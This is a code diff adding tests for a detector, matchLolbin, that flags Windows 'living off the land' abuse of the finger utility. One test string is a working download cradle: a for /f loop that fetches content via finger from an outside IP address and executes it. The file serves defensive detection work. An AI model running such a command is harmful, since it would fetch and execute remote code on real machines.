@@ -36,3 +36,16 @@ describe('matchLolbin', () => {
     expect(r.hit).toBe(false)
   })
 })
+
+describe('finger LOLBin', () => {
+  it('hits finger used as a download cradle inside a for /f loop', () => {
+    const r = matchLolbin(ctx("for /f %e in ('finger user@45.9.148.20') do %e"))
+    expect(r.hit).toBe(true)
+    expect(r.techniqueIds).toContain('T1105')
+  })
+
+  it('does NOT hit a bare finger command (no discriminator)', () => {
+    const r = matchLolbin(ctx('finger user@example.com'))
+    expect(r.hit).toBe(false)
+  })
+})
